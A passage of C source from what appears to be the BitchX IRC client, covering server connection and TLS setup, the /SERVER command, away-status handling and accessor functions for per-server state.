			say("new_des is %d", new_des);
		say("Unable to connect to port %d of server %s: %s", port,
				server_name, errno ? strerror(errno) :"unknown host");
		if ((from_server != -1)&& (server_list[from_server].read != -1))
			say("Connection to server %s resumed...", server_list[from_server].name);
#ifdef WDIDENT
		if(candofilestuff)
			remove(lockfile);
#endif
		return (-1);
	}

	if (*server_name != '/')
	{
		address_len = sizeof(struct sockaddr_foobar);
		getsockname(new_des, (struct sockaddr *) localaddr, &address_len);
		if ((server_list[from_server].local_addr.sf_family = localaddr->sf_family) == AF_INET)
			memcpy(&server_list[from_server].local_addr.sf_addr, &localaddr->sf_addr, sizeof(struct in_addr));
#ifdef IPV6
		else
			memcpy(&server_list[from_server].local_addr.sf_addr6, &localaddr->sf_addr6, sizeof(struct in6_addr));
#endif
       	}
#ifdef WDIDENT
	if(candofilestuff && (fp = fopen(lockfile, "w")) )
	{
		fprintf(fp, "%s %i %s", inet_ntoa(localaddr->sin_addr),
			htons(localaddr->sf_port), username);
		fclose(fp);
	}
#endif

	update_all_status(current_window, NULL, 0);
	add_to_server_list(server_name, port, NULL, NULL, NULL, NULL, NULL, 0, 1);

	server_list[from_server].closing = 0;
	if (port)
	{
		server_list[from_server].read = new_des;
		server_list[from_server].write = new_des;
	}
	else
		server_list[from_server].read = new_des;

	new_open(new_des);
	server_list[from_server].operator = 0;
	
	if (identd != -1)
		set_socketflags(identd, now);
	return 0;
}

/* This code either gets called from connect_to_server_by_refnum()
 * or from the main loop once a nonblocking connect has been
 * verified.
 */
int finalize_server_connect(int refnum, int c_server, int my_from_server)
{
	if (serv_open_func)
		(*serv_open_func)(my_from_server, server_list[my_from_server].local_addr, server_list[my_from_server].port);
	if ((c_server > -1) && (c_server != my_from_server))
	{
		server_list[c_server].reconnecting = 1;
		server_list[c_server].old_server = -1;
#ifdef NON_BLOCKING_CONNECTS
		server_list[c_server].server_change_pending = 0;
		server_list[refnum].from_server = -1;
#endif
		close_server(c_server, "changing servers");
	}

#ifdef HAVE_SSL
	if(get_server_ssl(refnum))
	{
		int err = 0;

		if(!server_list[refnum].ctx)
		{
			server_list[refnum].ctx = SSL_CTX_new (TLS_client_method());

			server_list[refnum].bio_fd = BIO_new_ssl_connect (server_list[refnum].ctx);

			BIO_get_ssl(server_list[refnum].bio_fd, &server_list[refnum].ssl_fd);

			SSL_set_mode(server_list[refnum].ssl_fd, SSL_MODE_AUTO_RETRY);

			BIO_set_conn_hostname(server_list[refnum].bio_fd, server_list[refnum].name);

			char tmp_BIO_port[6] = { 0, 0, 0, 0, 0, 0 };
			snprintf(tmp_BIO_port, sizeof(char) * 6,"%d", server_list[refnum].port);
			BIO_set_conn_port(server_list[refnum].bio_fd, tmp_BIO_port);

			BIO_set_nbio(server_list[refnum].bio_fd, 0);
			if (BIO_do_connect(server_list[refnum].bio_fd) <= 0)
			{
				say("SSL server connect failed!");
				SSL_CTX_free(server_list[refnum].ctx);
				BIO_free_all(server_list[refnum].bio_fd);
				ERR_print_errors_fp(stderr);
				err = -1;
				return 0;
			}

			if ((server_list[refnum].read = BIO_get_fd (server_list[refnum].bio_fd, 0)) < 0)
			{
				say("SSL_get_fd failed!");
				SSL_shutdown (server_list[refnum].ssl_fd);
				SSL_CTX_free(server_list[refnum].ctx);
				BIO_free_all(server_list[refnum].bio_fd);
				ERR_print_errors_fp(stderr);
				err = -1;
				return 0;
			}
			new_open(server_list[refnum].read);
		}
		say("SSL server connected");
	}
#endif

	if (!server_list[my_from_server].d_nickname)
		malloc_strcpy(&(server_list[my_from_server].d_nickname), nickname);

	register_server(my_from_server, server_list[my_from_server].d_nickname);
	server_list[refnum].last_msg = now;
	server_list[refnum].eof = 0;
/*	server_list[refnum].connected = 1; XXX: not registered yet */
	server_list[refnum].try_once = 0;
	server_list[refnum].reconnecting = 0;
	server_list[refnum].old_server = -1;
#ifdef NON_BLOCKING_CONNECTS
	server_list[refnum].server_change_pending = 0;
#endif
	*server_list[refnum].umode = 0;
	server_list[refnum].operator = 0;
	set_umode(refnum);

	/* This used to be in get_connected() */
	change_server_channels(c_server, my_from_server);
	set_window_server(server_list[refnum].server_change_refnum, my_from_server, 0);
	server_list[my_from_server].reconnects++;
	if (c_server > -1)
	{
		server_list[my_from_server].orignick = server_list[c_server].orignick;
		if (server_list[my_from_server].orignick)
			server_list[c_server].orignick = NULL;
	}
	set_server_req_server(refnum, 0);
	if (channel)
	{
		set_current_channel_by_refnum(0, channel);
		add_channel(channel, primary_server, 0);
		new_free(&channel);
		xterm_settitle();
	}
	return 0;
}

int 	BX_connect_to_server_by_refnum (int refnum, int c_server)
{
	char *sname;
	int sport;
	int conn;
	if (refnum < 0)
	{
		say("Connecting to refnum %d.  That makes no sense.", refnum);
		return -1;		/* XXXX */
	}

	sname = server_list[refnum].name;
	sport = server_list[refnum].port;

	if (server_list[refnum].read == -1)
	{
		if (sport == -1)
			sport = irc_port;

		from_server = refnum;
		say("Connecting to port %d of server %s [refnum %d]", sport, sname, refnum);
		conn = connect_to_server_direct(sname, sport);

		if (conn)
			return -1;

		server_list[refnum].connect_time = time(NULL);
#ifdef NON_BLOCKING_CONNECTS
		server_list[refnum].connect_wait = 1;
		server_list[refnum].c_server = c_server;
		server_list[refnum].from_server = from_server;
		server_list[refnum].server_change_pending = 1;
		if(c_server > -1)
			server_list[c_server].server_change_pending = 2;
#else
		finalize_server_connect(refnum, c_server, from_server);
#endif
	}
	else
	{
		say("Connected to port %d of server %s", sport, sname);
		from_server = refnum;
	}
	reset_display_target();
	update_all_status(current_window, NULL, 0);
	return 0;
}

/* This function should only be called from next_server! */
int next_server_internal(int server, int depth, int original)
{
int been_here = 0;

	server++;
	if (server == number_of_servers)
	{
		server = 0;
		been_here++;
	}

	if (get_int_var(SERVER_GROUPS_VAR) && server_list[original].snetwork)
	{
		while (!server_list[server].snetwork || strcmp(server_list[server].snetwork, server_list[original].snetwork))
		{
			server++;
			if (server == number_of_servers)
			{
				server = 0;
				if (been_here)
					break;
			}
		}
	}
	if(is_server_open(server))
	{
		/* The depth allows us to make sure we don't
		 * recurse forever if there are no servers in
		 * the list that meet the requirements.
		 */
		if(depth && server == original)
			return original;
		return next_server_internal(server, depth + 1, original);
	}
	return server;
}

/* Find the next server in the list that is not connected
 * and if SERVER_GROUPS is enabled, that is of the same group
 * as your original server.
 */
int next_server(int server)
{
	return next_server_internal(server, 0, server);
}

/*
 * get_connected: This function connects the primary server for IRCII.  It
 * attempts to connect to the given server.  If this isn't possible, it
 * traverses the server list trying to keep the user connected at all cost.  
 */
void	BX_get_connected (int server, int old_server)
{
	int i, spawned_server;

	for(i=0; i<number_of_servers; i++)
	{
		if(get_server_reconnect(i) > 0)
		{
			bitchsay("Server connect already in progress!");
			return;
		}
	}

	/* If the old server isn't connect or hasn't finished connected
	 * finish the deal and make sure it doesn't continue.
	 */
	spawned_server = find_old_server(old_server);
	if(!is_server_connected(spawned_server) || !get_server_nickname(spawned_server))
		close_server(spawned_server, empty_string);
	if(!is_server_connected(old_server) || !get_server_nickname(old_server))
	{
		close_server(old_server, empty_string);
		old_server = -1;
	}

	/* We shall defer this to get executed in the main
	 * loop to maintain other server or socket
	 * connections during connect attempts.
	 */
	set_server_reconnect(server, 1);
	set_server_req_server(server, server);
	set_server_old_server(server, old_server);
	set_server_change_refnum(server, -1);
	set_server_retries(server, 0);
}

/*
 * try_connect: This function connects the primary server for IRCII.  It
 * attempts to connect to the given server.  If this isn't possible, it
 * returns, and should reenter again from the main loop to try again,
 * once any ancillary processing is complete.
 */
void	try_connect (int server, int old_server)
{
	if (server_list)
	{
		if (server >= number_of_servers)
			server = 0;
		else if (server < 0)
			server = 0;

#ifdef HAVE_SSL
		server_list[server].ctx = NULL;
#endif
		if(server_list[server].server_change_refnum > -1)
			set_display_target_by_winref(server_list[server].server_change_refnum);

		set_server_old_server(server, old_server);
		if (connect_to_server_by_refnum(server, old_server))
			set_server_reconnect(server, 1);
	}
	else
	{
		if (do_hook(DISCONNECT_LIST,"No Server List"))
			put_it("%s", convert_output_format(fget_string_var(FORMAT_DISCONNECT_FSET), "%s %s", update_clock(GET_TIME), "You are not connected to a server. Use /SERVER to connect."));
	}
}

/* display_server_list: just guess what this does */
void BX_display_server_list (void)
{
	int	i;
	char *netw = NULL;
	
	if (server_list)
	{
		if (from_server != -1)
			say("Current server: %s %d",
					server_list[from_server].name,
					server_list[from_server].port);
		else
			say("Current server: <None>");

		if (primary_server != -1)
			say("Primary server: %s %d",
				server_list[primary_server].name,
				server_list[primary_server].port);
		else
			say("Primary server: <None>");

		say("Server list:");
		for (i = 0; i < number_of_servers; i++)
		{
			if (!netw && server_list[i].snetwork)
			{
				netw = server_list[i].snetwork;
				say("[%s]", netw);
			}
			else if (!netw && !server_list[i].snetwork)
			{
				netw = "unknown";
				say("[%s]", netw);
			}
			else if (netw && server_list[i].snetwork && my_stricmp(netw, server_list[i].snetwork))
			{
				netw = server_list[i].snetwork;
				say("[%s]", netw);
			}
			if (!server_list[i].nickname)
			{
				if (server_list[i].read == -1)
					say("\t%2d) %s %d", i,
						server_list[i].name,
						server_list[i].port);
				else
					say("\t%2d) %s %d", i,
						server_list[i].name,
						server_list[i].port);
			}
			else
			{
				if (server_list[i].read == -1)
					say("\t%2d) %s %d (was %s)", i,
						server_list[i].name,
						server_list[i].port,
						server_list[i].nickname);
				else
					say("\t%2d) %s %d (%s)", i,
						server_list[i].name,
						server_list[i].port,
						server_list[i].nickname);
			}
		}
	}
	else
		say("The server list is empty");
}

/*
 * server: the /SERVER command. Read the SERVER help page about 
 */
BUILT_IN_COMMAND(servercmd)
{
	char	*server = NULL;
	int	i, my_from_server = from_server;
#ifdef HAVE_SSL 
	int     ssl_connect = 0;
#endif

	if (!(server = next_arg(args, &args)))
	{
		display_server_list();
		return;
	}

#ifdef HAVE_SSL
	if((i = find_in_server_list(server, 0)) != -1)
		set_server_ssl(i, 0);

	if (strlen(server) > 1 && !my_strnicmp(server, "-SSL", strlen(server)))
	{
		if (!(server=new_next_arg(args,&args)))
		{
			say("Not enough parameters - supply server name");
			return;
		}
		say("Trying to establish ssl connection with server: %s",server);
		ssl_connect = 1;
	}
#endif

	/*
	 * Delete an existing server
	 */
	if (strlen(server) > 1 && !my_strnicmp(server, "-DELETE", strlen(server)))
	{
		if ((server = next_arg(args, &args)) != NULL)
		{
			if ((i = parse_server_index(server)) == -1)
			{
				if ((i = find_in_server_list(server, 0)) == -1)
				{
					say("No such server in list");
					return;
				}
			}
			if (is_server_open(i))
			{
				say("Can not delete server that is already open");
				return;
			}
			remove_from_server_list(i);
		}
		else
			say("Need server number for -DELETE");
	}
	/*
	 * Add a server, but dont connect
	 */
	else if (strlen(server) > 1 && !my_strnicmp(server, "-SEND", strlen(server)))
	{
		if (!(server = next_arg(args, &args)))
			return;
		if ((i = parse_server_index(server)) == -1)
			if ((i = find_in_server_list(server, 0)) == -1)
				if (isdigit((unsigned char)*server))
					i = my_atol(server);
		if (i != -1)
			my_send_to_server(i, "%s", args);
	}
	else if (strlen(server) > 1 && !my_strnicmp(server, "-ADD", strlen(server)))
	{
		if ((server = new_next_arg(args, &args)))
			(void) find_server_refnum(server, &args);
		else
			say("Need server info for -ADD");
	}
	/*
	 * Save the server list to a file, or to the .ircservers
	 */
	else if (strlen(server) > 1 && !my_strnicmp(server, "-SAVE", strlen(server)))
	{
		char *filename = new_next_arg(args, &args);

		write_server_file(filename);
	}
		/*
	 * The difference between /server +foo.bar.com  and
	 * /window server foo.bar.com is that this can support
	 * doing a server number.  That makes it a tad bit more
	 * difficult to parse, too. :P  They do the same thing,
	 * though.
	 */
	else if (*server == '+')
	{
		if (*++server)
		{
			i = find_server_refnum(server, &args);
#ifdef HAVE_SSL
			if(ssl_connect)
				set_server_ssl(i, 1);
#endif
			if (!connect_to_server_by_refnum(i, -1))
				set_window_server(0, i, 0);
		}
		else
			get_connected(primary_server + 1, my_from_server);
	}
	/*
	 * You can only detach a server using its refnum here.
	 */
	else if (*server == '-')
	{
		if (*++server)
		{
			i = find_server_refnum(server, &args);
			if (i == primary_server)
			{
			    say("You can't close your primary server!");
			    return;
			}
			close_server(i, "closing server");
			window_check_servers(i);
		}
		else
			get_connected(from_server - 1, my_from_server);
	}
	/*
	 * Just a naked /server with no flags
	 */
	else
	{
		i = find_server_refnum(server, &args);
#ifdef HAVE_SSL
		if(ssl_connect)
			set_server_ssl(i, 1);
#endif
		close_unattached_servers();
		get_connected(i, my_from_server);
	}
}

/*
 * flush_server: eats all output from server, until there is at least a
 * second delay between bits of servers crap... useful to abort a /links. 
 */
void BX_flush_server (void)
{
	fd_set rd;
	struct timeval timeout;
	int	flushing = 1;
	int	des;
	char	buffer[BIG_BUFFER_SIZE + 1];

	if ((des = server_list[from_server].read) == -1)
		return;
	timeout.tv_usec = 0;
	timeout.tv_sec = 1;
	while (flushing)
	{
		FD_ZERO(&rd);
		FD_SET(des, &rd);
		switch (new_select(&rd, NULL, &timeout))
		{
			case -1:
			case 0:
				flushing = 0;
				break;
			default:
				if (FD_ISSET(des, &rd))
				{
					if (server_list[from_server].enable_ssl)
					{
						if (!dgets(buffer, des, 0, BIG_BUFFER_SIZE, server_list[from_server].bio_fd))
							flushing = 0;
					}
					else
					{
						if (!dgets(buffer, des, 0, BIG_BUFFER_SIZE, NULL))
							flushing = 0;
					}

				}
				break;
		}
	}
	/* make sure we've read a full line from server */
	FD_ZERO(&rd);
	FD_SET(des, &rd);
	if (new_select(&rd, NULL, &timeout) > 0)
	{
		if (server_list[from_server].enable_ssl)
			dgets(buffer, des, 1, BIG_BUFFER_SIZE, server_list[from_server].bio_fd);
		else
			dgets(buffer, des, 1, BIG_BUFFER_SIZE, NULL);
	}
}


static char *set_umode (int du_index)
{
	char *c = server_list[du_index].umode;
	long flags = server_list[du_index].flags;
	long flags2 = server_list[du_index].flags2;
	int i;
	
	for (i = 0; umodes[i]; i++)
	{
		if (umodes[i] == 'o' || umodes[i] == 'O')
			continue;
		if (i > 31)
		{
			if (flags2 & (0x1 << (i - 32)))
				*c++ = server_list[du_index].umodes[i];
		}
		else
		{
			if (flags & (0x1 << i))
				*c++ = server_list[du_index].umodes[i];
		}
	}
	if (get_server_operator(du_index))
		*c++ = 'o';
	*c = 0;	
	return server_list[du_index].umode;
}

char *BX_get_possible_umodes (int gu_index)
{
	if (gu_index == -1)
		gu_index = primary_server;
	else if (gu_index >= number_of_servers)
		return empty_string;

	return server_list[gu_index].umodes;
}

char *BX_get_umode (int gu_index)
{
	if (gu_index == -1)
		gu_index = primary_server;
	else if (gu_index >= number_of_servers)
		return empty_string;

	return server_list[gu_index].umode;
}

void clear_user_modes (int gindex)
{
	if (gindex == -1)
		gindex = primary_server;
	else if (gindex >= number_of_servers)
		return;
	server_list[gindex].flags = 0;
	server_list[gindex].flags2 = 0;
	set_umode(gindex);
}

/*
 * Encapsulates everything we need to change our AWAY status.
 * This improves greatly on having everyone peek into that member.
 * Also, we can deal centrally with someone changing their AWAY
 * message for a server when we're not connected to that server
 * (when we do connect, then we send out the AWAY command.)
 * All this saves a lot of headaches and crashes.
 */
void	BX_set_server_away (int ssa_index, char *message, int silent)
{
	int old_from_server = from_server;

	from_server = ssa_index;
	if (ssa_index < 0 && !silent)
		say("You are not connected to a server.");
	else if (message && *message)
	{
		if (server_list[ssa_index].away != message)
			malloc_strcpy(&server_list[ssa_index].away, message);

		if (!server_list[ssa_index].awaytime)
			server_list[ssa_index].awaytime = now;

		if (get_int_var(MSGLOG_VAR))
			log_toggle(1, NULL);
		if (!is_server_connected(ssa_index))
		{
			from_server = old_from_server;
			return;
		}
		if (fget_string_var(FORMAT_AWAY_FSET) && !silent)
		{
			char buffer[BIG_BUFFER_SIZE+1];
			if (get_int_var(SEND_AWAY_MSG_VAR))
			{
				char *p = NULL;
				ChannelList *chan;
				if (get_server_version(ssa_index) == Server2_8hybrid6)
				{
					for (chan = server_list[ssa_index].chan_list; chan; chan = chan->next)
						send_to_server("PRIVMSG %s :ACTION %s", chan->channel, 
							stripansicodes(convert_output_format(fget_string_var(FORMAT_AWAY_FSET), "%s [\002BX\002-MsgLog %s] %s",update_clock(GET_TIME), get_int_var(MSGLOG_VAR)?"On":"Off", message)));
				}
				else
				{
					for (chan = server_list[ssa_index].chan_list; chan; chan = chan->next)
						m_s3cat(&p, ",", chan->channel);
					if (p)
						send_to_server("PRIVMSG %s :ACTION %s", p, 
							stripansicodes(convert_output_format(fget_string_var(FORMAT_AWAY_FSET), "%s [\002BX\002-MsgLog %s] %s",update_clock(GET_TIME), get_int_var(MSGLOG_VAR)?"On":"Off", message)));
						new_free(&p);
				}
			}
			send_to_server("%s :%s", "AWAY", stripansicodes(convert_output_format(fget_string_var(FORMAT_AWAY_FSET), "%s [\002BX\002-MsgLog %s] %s", update_clock(GET_TIME), get_int_var(MSGLOG_VAR)?"On":"Off",message)));
			strncpy(buffer, convert_output_format(fget_string_var(FORMAT_SEND_ACTION_FSET), "%s %s $C ", update_clock(GET_TIME), server_list[ssa_index].nickname), BIG_BUFFER_SIZE);
			strlcat(buffer, convert_output_format(fget_string_var(FORMAT_AWAY_FSET), "%s [\002BX\002-MsgLog %s] %s", update_clock(GET_TIME), get_int_var(MSGLOG_VAR)?"On":"Off", message), BIG_BUFFER_SIZE);
			put_it("%s", buffer);
		}
		else
			send_to_server("%s :%s", "AWAY", stripansicodes(convert_output_format(message, NULL)));
	}
	else
	{
		server_list[ssa_index].awaytime = 0;
		new_free(&server_list[ssa_index].away);
		if (is_server_connected(ssa_index))
			send_to_server("AWAY :");
	}
	from_server = old_from_server;
}

char *	BX_get_server_away (int gsa_index)
{
	if (gsa_index == -1)
		return NULL;
	if (gsa_index == -2)
	{
		int	i;
		for (i = 0; i < number_of_servers; i++)
		{
			if (is_server_connected(i) && server_list[i].away)
				return server_list[i].away;
		}
		return NULL;
	}
	if (gsa_index < 0 || gsa_index > number_of_servers)
		return NULL;
	return server_list[gsa_index].away;
}

void set_server_awaytime(int server, time_t t)
{
	if (server <= -1 || server > number_of_servers)
		return;
	server_list[server].awaytime = t;
}

time_t get_server_awaytime(int server)
{
	if (server <= -1 || server > number_of_servers)
		return 0;
	return server_list[server].awaytime;
}

void	BX_set_server_flag (int ssf_index, int flag, int value)
{
	if (ssf_index == -1)
		ssf_index = primary_server;
	else if (ssf_index >= number_of_servers)
		return;
	if (flag > 31)
	{
		if (value)
			server_list[ssf_index].flags2 |= 0x1 << (flag - 32);
		else
			server_list[ssf_index].flags2 &= ~(0x1 << (flag - 32));
	}
	else
	{
		if (value)
			server_list[ssf_index].flags |= 0x1 << flag;
		else
			server_list[ssf_index].flags &= ~(0x1 << flag);
	}
	set_umode(ssf_index);
}

int	BX_get_server_flag (int gsf_index, int value)
{
	if (gsf_index == -1)
		gsf_index = primary_server;
	else if (gsf_index >= number_of_servers)
		return 0;
	if (value > 31)
		return server_list[gsf_index].flags2 & (0x1 << (value - 32));
	else
		return server_list[gsf_index].flags & (0x1 << value);
}

/*
 * set_server_version: Sets the server version for the given server type.  A
 * zero version means pre 2.6, a one version means 2.6 aso. (look server.h
 * for typedef)
 */
void	BX_set_server_version (int ssv_index, int version)
{
	if (ssv_index == -1)
		ssv_index = primary_server;
	else if (ssv_index >= number_of_servers)
		return;
	server_list[ssv_index].version = version;
}

/*
 * get_server_version: returns the server version value for the given server
 * index 
 */
int	BX_get_server_version (int gsv_index)
{
	if (gsv_index == -1)
		gsv_index = primary_server;
	else if (gsv_index >= number_of_servers)
		return 0;
	if (gsv_index <= -1)
		return 0;
	return (server_list[gsv_index].version);
}

/* get_server_name: returns the name for the given server index */
char	*BX_get_server_name (int gsn_index)
{
	if (gsn_index == -1)
		gsn_index = primary_server;
	if (gsn_index <= -1 || gsn_index >= number_of_servers)
		return empty_string;

	return (server_list[gsn_index].name);
}

char	*BX_get_server_network (int gsn_index)
{
	if (gsn_index == -1)
		gsn_index = primary_server;
	if (gsn_index <= -1 || gsn_index >= number_of_servers)
		return empty_string;

	return (server_list[gsn_index].snetwork);
}

/*
 * set_server_password: this sets the password for the server with the given
 * index.  If password is null, the password for the given server is returned 
 */
char	*BX_set_server_password (int ssp_index, char *password)
{

	if (server_list)
	{
		if (password)
			malloc_strcpy(&(server_list[ssp_index].password), password);
		return (server_list[ssp_index].password);
	}
	else
		return (NULL);
}

/* server_list_size: returns the number of servers in the server list */
int BX_server_list_size (void)
{
	return number_of_servers;
}

int get_server_watch(int gsn_index)
{
	if (gsn_index == -1)
		gsn_index = primary_server;
	if (gsn_index <= -1 || gsn_index >= number_of_servers)
		return 0;

	return server_list[gsn_index].watch;
}

void set_server_watch(int gsn_index, int watch)
{
	if (gsn_index == -1)
		gsn_index = primary_server;
	if (gsn_index == -1 || gsn_index >= number_of_servers)
		return;

	server_list[gsn_index].watch = watch;
}

/* get_server_itsname: returns the server's idea of its name */
char	*BX_get_server_itsname (int gsi_index)
{
	if (gsi_index==-1)
		gsi_index=primary_server;
	else if (gsi_index >= number_of_servers)
		return empty_string;

	/* better check gsi_index for -1 here CDE */
	if (gsi_index == -1)
		return empty_string;

	if (server_list[gsi_index].itsname)
		return server_list[gsi_index].itsname;
	else
		return server_list[gsi_index].name;
}

char	*get_server_pass (int gsn_index)
{
	if (gsn_index == -1)
		gsn_index = primary_server;
	if (gsn_index == -1 || gsn_index >= number_of_servers)
		return empty_string;

 	return (server_list[gsn_index].password);
}

void	BX_set_server_itsname (int ssi_index, char *name)
{
	if (ssi_index==-1)
		ssi_index=primary_server;
	else if (ssi_index >= number_of_servers)
		return;

	malloc_strcpy(&server_list[ssi_index].itsname, name);
}

/*
 * is_server_open: Returns true if the given server index represents a server
 * with a live connection, returns false otherwise 
 */
int	BX_is_server_open (int iso_index)
{
	if (iso_index >= 0 && iso_index < number_of_servers)
		return (server_list[iso_index].read != -1);
	return 0;
}

/*
 * is_server_connected: returns true if the given server is connected.  This
 * means that both the tcp connection is open and 
 * ***the user is properly registered***
 */
int	BX_is_server_connected (int isc_index)
{
	if (isc_index >= 0 && isc_index < number_of_servers)
		return (server_list[isc_index].connected);
	return 0;
}

void check_host(void);

void	clear_sent_to_server (int servnum)
{
	server_list[servnum].sent = 0;
}

int	sent_to_server (int servnum)
{
	return server_list[servnum].sent;
}


/* get_server_port: Returns the connection port for the given server index */
int	BX_get_server_port (int gsp_index)
{
	if (gsp_index == -1)
		gsp_index = primary_server;
	else if (gsp_index >= number_of_servers)
		return 0;

	return (server_list[gsp_index].port);
}

/*
 * get_server_nickname: returns the current nickname for the given server
 * index 
 */
char	*BX_get_server_nickname (int gsn_index)
{
	if (gsn_index >= number_of_servers)
		return empty_string;
	else if (gsn_index > -1 && server_list[gsn_index].nickname)
		return (server_list[gsn_index].nickname);
	else
		return "<Nickname not registered yet>";
}


/* 
 * set_server2_8 - set the server as a 2.8 server 
 * This is used if we get a 001 numeric so that we dont bite on
 * the "kludge" that ircd has for older clients
 */
void 	BX_set_server2_8 (int ss2_index, int value)
{
	if (ss2_index < number_of_servers)
		server_list[ss2_index].server2_8 = value;
	return;
}

/* get_server2_8 - get the server as a 2.8 server */
int 	BX_get_server2_8 (int gs2_index)
{
	if (gs2_index == -1)
		gs2_index = primary_server;
	else if (gs2_index >= number_of_servers)
		return 0;
	return (server_list[gs2_index].server2_8);
}
	
/*
 * get_server_operator: returns true if the user has op privs on the server,
 * false otherwise 
 */
int	BX_get_server_operator (int gso_index)
{
	if ((gso_index < 0) || (gso_index >= number_of_servers))
		return 0;
	return (server_list[gso_index].operator);
}

/*
 * set_server_operator: If flag is non-zero, marks the user as having op
 * privs on the given server.  
 */
void	BX_set_server_operator (int sso_index, int flag)
{
	if (sso_index < 0 || sso_index >= number_of_servers)
		return;
	server_list[sso_index].operator = flag;
	oper_command = 0;
	set_umode(sso_index);
}

/*
 * set_server_nickname: sets the nickname for the given server to nickname.
 * This nickname is then used for all future connections to that server
 * (unless changed with NICK while connected to the server 
 */
void 	BX_set_server_nickname (int ssn_index, char *nick)
{
	if (ssn_index != -1 && ssn_index < number_of_servers)
	{
		malloc_strcpy(&(server_list[ssn_index].nickname), nick);
		if (ssn_index == primary_server)
			strmcpy(nickname,nick, NICKNAME_LEN );
	}
	update_all_status(current_window, NULL, 0);
}


void 	BX_set_server_redirect (int s, const char *who)
{
	malloc_strcpy(&server_list[s].redirect, who);
}

char	*BX_get_server_redirect(int s)
{
	return server_list[s].redirect;
}

int	BX_check_server_redirect (char *who)
{
	if (!who || !server_list[from_server].redirect)
		return 0;

	if (!strncmp(who, "***", 3) && !strcmp(who+3, server_list[from_server].redirect))
	{
		set_server_redirect(from_server, NULL);
		return 1;
	}

	return 0;
}

void	register_server (int ssn_index, char *nick)
{
	int old_from_server = from_server;
	if (server_list[ssn_index].password)
		my_send_to_server(ssn_index, "PASS %s", server_list[ssn_index].password);

	if (server_list[ssn_index].sasl_nick && server_list[ssn_index].sasl_pass)
		my_send_to_server(ssn_index, "CAP REQ :sasl");
		
	my_send_to_server(ssn_index, "USER %s %s %s :%s", username, 
			(send_umode && *send_umode) ? send_umode : 
			(LocalHostName?LocalHostName:hostname), 
			username, *realname ? realname : space);

	change_server_nickname(ssn_index, nick);

	server_list[ssn_index].login_flags &= ~LOGGED_IN;
	server_list[ssn_index].login_flags &= ~CLOSE_PENDING;
	server_list[ssn_index].last_msg = now;
	server_list[ssn_index].eof = 0;
/*	server_list[ssn_index].connected = 1; XXX: We aren't sure yet */
	*server_list[ssn_index].umode = 0;
	server_list[ssn_index].operator = 0;
/*	set_umode(ssn_index); */
        server_list[ssn_index].login_flags |= LOGGED_IN;
	from_server = old_from_server;
	check_host();
}

void	BX_set_server_cookie (int ssm_index, char *cookie)
{
	if (ssm_index != -1 && ssm_index < number_of_servers && cookie)
		malloc_strcpy(&server_list[ssm_index].cookie, cookie);
}

char	*BX_get_server_cookie(int ssm_index)
{
	char *s = NULL;
	if (ssm_index != -1 && ssm_index < number_of_servers)
		s = server_list[ssm_index].cookie;
	return s;
}

void 	BX_set_server_motd (int ssm_index, int flag)
{
	if (ssm_index != -1 && ssm_index < number_of_servers)
		server_list[ssm_index].motd = flag;
}

int	BX_get_server_lag (int gso_index)
{
	if ((gso_index < 0 || gso_index >= number_of_servers))
		return 0;
	return(server_list[gso_index].lag);
}

void BX_set_server_lag (int gso_index, int secs)
{
	if ((gso_index != -1 && gso_index < number_of_servers))
		server_list[gso_index].lag = secs;
}


time_t	get_server_lagtime (int gso_index)
{
	if ((gso_index < 0 || gso_index >= number_of_servers))
		return 0;
	return(server_list[gso_index].lag_time);
}

void set_server_lagtime (int gso_index, time_t secs)
{
	if ((gso_index != -1 && gso_index < number_of_servers))
		server_list[gso_index].lag_time = secs;
}


int 	BX_get_server_motd (int gsm_index)
{
	if (gsm_index != -1 && gsm_index < number_of_servers)
		return(server_list[gsm_index].motd);
	return (0);
}

void 	BX_server_is_connected (int sic_index, int value)
{
	if (sic_index < 0 || sic_index >= number_of_servers)
		return;

	server_list[sic_index].connected = value;
	if (value)
		server_list[sic_index].eof = 0;
}

void	set_server_version_string (int servnum, const char *ver)
{
	malloc_strcpy(&server_list[servnum].version_string, ver);
}

char *	get_server_version_string (int servnum)
{
	 return server_list[servnum].version_string;
}

unsigned long get_server_ircop_flags(int servnum)
{
	if (servnum >= 0 && (servnum <= number_of_servers))
		return server_list[servnum].ircop_flags;
	return 0;
}

void set_server_ircop_flags(int servnum, unsigned long flag)
{
	if (servnum < 0 || servnum >= number_of_servers)
		return;
	server_list[servnum].ircop_flags = flag;
}

int get_server_in_timed(int servnum)
{
	if (servnum < 0 || servnum >= number_of_servers)
		return 0;
	return server_list[servnum].in_timed_server;
}

void set_server_in_timed(int servnum, int val)
{
	if (servnum < 0 || servnum >= number_of_servers)
		return;
	server_list[servnum].in_timed_server = val;
}

time_t get_server_lastmsg(int servnum)
{
	if (servnum < 0 || servnum >= number_of_servers)
		return 0;
	return server_list[servnum].last_msg;
}

char	*get_server_userhost (int gsu_index)
{
	if (gsu_index >= number_of_servers)
		return empty_string;
	else if (gsu_index != -1 && server_list[gsu_index].userhost)
		return (server_list[gsu_index].userhost);
	else
		return get_userhost();
}

/*
 * got_my_userhost -- callback function, XXXX doesnt belong here
 */
void 	got_my_userhost (UserhostItem *item, char *nick, char *stuff)
{
	new_free(&server_list[from_server].userhost);
	server_list[from_server].userhost = m_3dup(item->user, "@", item->host);
	lame_resolv(item->host, &server_list[from_server].uh_addr);
}



static int write_to_server(int server, int des, char *buffer)
{
int err = 0;
	if (do_hook(SEND_TO_SERVER_LIST, "%d %d %s", server, des, buffer))
	{
		if (serv_output_func)
			err = (*serv_output_func)(server, des, buffer, strlen(buffer));
		else
		{
#ifdef HAVE_SSL
			if(get_server_ssl(server))
			{
				if(!server_list[server].bio_fd)
				{
					say ("SSL write error");
					return -1;
				}
				err = BIO_write(server_list[server].bio_fd, buffer, strlen(buffer));
			}
			else
#endif
				err = write(des, buffer, strlen(buffer));
	}
		if ((err == -1) && !get_int_var(NO_FAIL_DISCONNECT_VAR))
		{
			say("Write to server failed.  Closing connection.");
#ifdef HAVE_SSL
			if(get_server_ssl(server))
			{
				say("Closing SSL connection");
				SSL_shutdown (server_list[server].ssl_fd);
				SSL_CTX_free(server_list[server].ctx);
				BIO_free_all(server_list[server].bio_fd);
			}
#endif
			close_server(server, strerror(errno));
			get_connected(server, server);
		}
	}
	return err;
}

int BX_is_server_queue(void)
{
	if (serverqueue)
		return 1;
	return 0;
}

void send_from_server_queue(void)
{
QueueSend *tmp;
	if ((tmp = serverqueue))
	{
		if (now - server_list[tmp->server].last_sent >= get_int_var(QUEUE_SENDS_VAR))
		{
			serverqueue = tmp->next;
			if (is_server_open(tmp->server))
